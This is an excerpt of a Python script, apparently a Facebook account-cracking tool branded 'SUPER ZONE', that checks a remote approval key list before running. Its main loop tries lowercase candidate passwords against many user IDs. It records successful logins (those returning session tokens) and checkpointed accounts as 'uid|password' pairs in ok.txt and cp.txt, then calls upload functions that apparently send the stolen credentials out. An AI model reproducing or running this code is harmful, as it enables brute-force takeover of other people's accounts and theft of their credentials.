...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/SUPER ZONE/approval.txt/blob/main/Ap.txt"])
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰SUPER ZONE")
	subprocess.check_output(["am", "start", "+8801840215106"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/SHAHZAD-AAHME/FRIENDS-LOVER/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Muslim Cyber 
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SUPER ZONE_OLD] : %s/%s -> \033[0;92m [ SUPER ZONE-OK:%s ]- \033[0;91m[SUPER ZONE-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SUPER ZONE-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SUPER ZONE-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SUPER ZONE-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SUPER ZONE-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
